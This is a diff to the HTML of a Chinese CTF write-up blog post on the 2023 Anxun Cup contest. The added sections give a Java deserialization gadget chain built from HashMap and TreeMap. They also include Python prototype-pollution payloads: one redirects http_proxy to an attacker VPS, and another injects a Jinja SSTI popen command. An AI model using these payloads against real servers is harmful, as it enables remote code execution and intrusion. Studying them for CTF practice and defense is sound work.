@@ -74,8 +74,13 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226235550655.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226235051453.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226235119574.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227135539670.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227140618936.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227140904083.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227141137629.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227141849324.png">
 <meta property="article:published_time" content="2023-12-24T04:40:44.000Z">
-<meta property="article:modified_time" content="2023-12-27T04:08:18.088Z">
+<meta property="article:modified_time" content="2023-12-28T11:34:55.508Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225135621158.png">
@@ -283,7 +288,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          22k 字
+          25k 字
         
       </span>
     
@@ -294,7 +299,7 @@
         
         
         
-          187 分钟
+          213 分钟
         
       </span>
     
@@ -955,6 +960,48 @@ setFieldValue(m, <span class="hljs-string">&quot;root&quot;</span>, node);</code
 <p>看这两处地方，等于说是环境已经配好，我们控制反序列化数据即可</p>
 <p>和前一个分析差不多</p>
 <p>其实理论上讲<code>HashMap</code>应该可以使用上面<code>TreeMap$Entry</code>的方式进行替代，我懒得想了，你可以试试</p>
+<h3 id="HashMap-TreeMap"><a href="#HashMap-TreeMap" class="headerlink" title="HashMap+TreeMap"></a>HashMap+TreeMap</h3><p>不用那个<code>TreeBag</code>也可以，用原生JDK自带的。</p>
+<p>不止<code>TreeMap</code>的<code>put</code>会调用<code>compare</code>，其<code>get</code>也会调用<code>compare</code></p>
+<p>那哪里会调用<code>Map#get</code>呢，答案是<code>AbstractMap.equals</code>（刚好<code>TreeMap</code>没有重写<code>equals</code>方法）</p>
+<p><code>HashMap#readObject</code>会调用<code>putVal</code>，<code>putVal</code>当遇到哈希碰撞时就会调用<code>equals</code></p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">TreeMap treeMap1 = make<span class="hljs-constructor">Tree(<span class="hljs-params">obj</span>, <span class="hljs-params">comparator</span>)</span>;
+TreeMap treeMap2 = make<span class="hljs-constructor">Tree(<span class="hljs-params">obj</span>, <span class="hljs-params">comparator</span>)</span>;
+HashMap hashMap = make<span class="hljs-constructor">Map(<span class="hljs-params">treeMap1</span>, <span class="hljs-params">treeMap2</span>)</span>;
+
+public static TreeMap&lt;Object, Object&gt; make<span class="hljs-constructor">Tree(Object <span class="hljs-params">o</span>, Comparator <span class="hljs-params">comparator</span>)</span> throws Exception &#123;
+    TreeMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> TreeMap&lt;&gt;<span class="hljs-literal">()</span>;
+    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">map</span>, <span class="hljs-string">&quot;size&quot;</span>, 1)</span>;
+    Class&lt;?&gt; nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.TreeMap$Entry&quot;</span>)</span>;
+    Constructor nodeCons = nodeC.get<span class="hljs-constructor">DeclaredConstructor(Object.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">nodeC</span>)</span>;
+    nodeCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+
+    Object node = nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">o</span>, 1, <span class="hljs-params">null</span>)</span>;
+    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">map</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-params">node</span>)</span>;
+    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">map</span>, <span class="hljs-string">&quot;comparator&quot;</span>, <span class="hljs-params">comparator</span>)</span>;
+
+    return map;
+&#125;
+
+public static HashMap&lt;Object, Object&gt; make<span class="hljs-constructor">Map(Object <span class="hljs-params">v1</span>, Object <span class="hljs-params">v2</span>)</span> throws Exception &#123;
+    HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;
+    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;size&quot;</span>, 2)</span>;
+    Class&lt;?&gt; nodeC;
+    <span class="hljs-keyword">try</span> &#123;
+        nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>)</span>;
+    &#125; catch (ClassNotFoundException e) &#123;
+        nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>)</span>;
+    &#125;
+    Constructor&lt;?&gt; nodeCons = nodeC.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">int</span>.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">nodeC</span>)</span>;
+    nodeCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+
+    Object tbl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">nodeC</span>, 2)</span>;
+    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">0</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v1</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-params">null</span>)</span>);
+    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">1</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v2</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-params">null</span>)</span>);
+    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;table&quot;</span>, <span class="hljs-params">tbl</span>)</span>;
+    return s;
+&#125;</code></pre></div>
+
+<h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>模板注入的payload放入<code>BaseDataSource</code> 的url的话会被urlencode，所以放入<code>ServerNames</code>中</p>
 <h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226230750413.png" srcset="/img/loading.gif" lazyload alt="image-20231226230750413"></p>
 <p>exp拿去url编码</p>
 <p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226230829491.png" srcset="/img/loading.gif" lazyload alt="image-20231226230829491"></p>
@@ -1040,10 +1087,11 @@ Jonathan
 
 http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0<span class="hljs-regexp">/search?file=/</span>app/app.py&amp;type=text
 
-<span class="hljs-regexp">//</span>不知道有什么用
 http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0<span class="hljs-regexp">/search?file=/</span>app/api.py&amp;type=text</code></pre></div>
 
-<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>源码中存在</p>
+
+
+<p>源码中存在</p>
 <div class="code-wrapper"><pre><code class="hljs xquery">def <span class="hljs-keyword">update</span>(src, dst):
     <span class="hljs-keyword">if</span> hasattr(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):
         <span class="hljs-keyword">for</span><span class="hljs-built_in"> key</span> <span class="hljs-keyword">in</span> src:
@@ -1062,7 +1110,7 @@ http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.
                 setattr(dst,<span class="hljs-built_in"> key</span>, <span class="hljs-keyword">value</span>)
 </code></pre></div>
 
-<p>直接python原型链污染</p>
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>直接python原型链污染</p>
 <p>官方wp给出一位师傅的wp</p>
 <p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226234721487.png" srcset="/img/loading.gif" lazyload alt="image-20231226234721487"></p>
 <p>我一看就知道是<a target="_blank" rel="noopener" href="https://tttang.com/archive/1876/#toc_jinja">Python原型链污染变体(prototype-pollution-in-python) - 跳跳糖 (tttang.com)</a>这一篇文章的</p>
@@ -1099,8 +1147,72 @@ http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.
 <div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40526</span><span class="hljs-regexp">/api-base/</span>v0<span class="hljs-regexp">/search?file=/</span>app/EY6zl0isBvAWZFxZMvCCCTS3VRVMvoNi_FLAG&amp;type=text</code></pre></div>
 
 <p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226235119574.png" srcset="/img/loading.gif" lazyload alt="image-20231226235119574"></p>
+<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227135539670.png" srcset="/img/loading.gif" lazyload alt="image-20231227135539670"></p>
+<p>很明显的ssti漏洞，我们控制请求返回的结果为payload即可</p>
+<p>但是如何控制呢，第一想法是上面的原型链污染写文件，那还不如直接非预期呢</p>
+<p>这里很妙的使用了<code>http_proxy</code>这个环境变量</p>
+<p><code>http_proxy</code> 环境变量主要是由底层 HTTP 请求库（如 <code>requests</code>）使用的，在<code>requests.get</code>时请求就会走代理</p>
+<p>python原型链污染<code>http_proxy</code></p>
+<div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>
+    <span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>
+    	<span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>
+        	<span class="hljs-attr">&quot;os&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>
+            	<span class="hljs-attr">&quot;environ&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>
+                	<span class="hljs-attr">&quot;http_proxy&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;vps_ip:port&quot;</span>
+            	<span class="hljs-punctuation">&#125;</span>
+        	<span class="hljs-punctuation">&#125;</span>
+    	<span class="hljs-punctuation">&#125;</span>
+    <span class="hljs-punctuation">&#125;</span>
+<span class="hljs-punctuation">&#125;</span></code></pre></div>
+
+<p>然后使<code>type</code>为<code>text</code>即可，<code>file</code>随意</p>
+<div class="code-wrapper"><pre><code class="hljs excel">/api-<span class="hljs-built_in">base</span>/<span class="hljs-symbol">v0</span>/<span class="hljs-built_in">search</span>?file=user&amp;<span class="hljs-built_in">type</span>=<span class="hljs-built_in">text</span></code></pre></div>
+
+<p>开启监听，收到请求</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227140618936.png" srcset="/img/loading.gif" lazyload alt="image-20231227140618936"></p>
+<p>这里我们能控制请求的响应，所以根据响应包来对应写数据</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227140904083.png" srcset="/img/loading.gif" lazyload alt="image-20231227140904083"></p>
+<p>要手动ctrl+c退出</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227141137629.png" srcset="/img/loading.gif" lazyload alt="image-20231227141137629"></p>
+<p>说到<code>http_proxy</code>,前面写到<a href="https://zer0peach.github.io/2023/10/23/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/#%E8%A7%A3%E6%B3%95-HTTPoxy%E6%BC%8F%E6%B4%9E">已发生的比赛刷题 - Zer0peach can’t think</a>过类似的题</p>
+<p>php 5.6.23的漏洞</p>
+<p>在<code>CGI</code>(RFC 3875)的模式的时候， 会把请求中的Header， 加上<code>HTTP_</code> 前缀， 注册为环境变量</p>
+<p>Header中发送一个<code>Proxy:xxxxxx</code>, 那么PHP就会把他注册为<code>HTTP_PROXY</code>环境变量</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//若返回内容中有success即可读取flag</span>
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>])) &#123;
+    <span class="hljs-variable">$client</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>();
+    <span class="hljs-variable">$response</span> = <span class="hljs-variable">$client</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;http://127.0.0.1:5000/api/eligible&#x27;</span>);
+    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$response</span>-&gt;<span class="hljs-title function_ invoke__">getBody</span>();
+    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$content</span>, <span class="hljs-literal">TRUE</span>);
+    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;success&#x27;</span>] === <span class="hljs-literal">true</span>) &#123;    
+      <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>);
+    &#125;
+&#125;</code></pre></div>
+
+<p>同样是访问本地，要控制返回结果</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227141849324.png" srcset="/img/loading.gif" lazyload alt="image-20231227141849324"></p>
+<p>然后同样做法即可</p>
+<h3 id="又一种方法"><a href="#又一种方法" class="headerlink" title="又一种方法"></a>又一种方法</h3><p><code>pankas</code>师傅的方法</p>
+<p>就像预期解说的要控制响应数据</p>
+<p>那就污染Response，太强了，炸裂</p>
+<div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+    <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+        <span class="hljs-attr">&quot;requests&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+            <span class="hljs-attr">&quot;Response&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+                <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[154].__init__.__globals__[&#x27;popen&#x27;](&#x27;命令&#x27;).read()&#125;&#125;&quot;</span>
+            <span class="hljs-punctuation">&#125;</span>
+        <span class="hljs-punctuation">&#125;</span>
+    <span class="hljs-punctuation">&#125;</span>
+<span class="hljs-punctuation">&#125;</span></code></pre></div>
+
+
+
+
+
 <h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://dce.i-soon.net/#/group/detail/31">安洵DCE平台 (i-soon.net)</a></p>
 <p>[第六届安洵杯网络安全挑战赛 Writeup - Boogiepop Doesn’t Laugh (boogipop.com)](<a target="_blank" rel="noopener" href="https://boogipop.com/2023/12/24/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B">https://boogipop.com/2023/12/24/第六届安洵杯网络安全挑战赛</a> Writeup&#x2F;)</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ThIPnl2EflGXhIjSJAmZhw">https://mp.weixin.qq.com/s/ThIPnl2EflGXhIjSJAmZhw</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/p4d0rn/Java_Zoo/blob/main/CTF/axb2023.md">Java_Zoo&#x2F;CTF&#x2F;axb2023.md at main · p4d0rn&#x2F;Java_Zoo (github.com)</a></p>
 
                 
               </div>
@@ -1162,6 +1274,12 @@ http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2023/12/28/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/" title="JDK17+绕过反射限制">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">JDK17+绕过反射限制</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
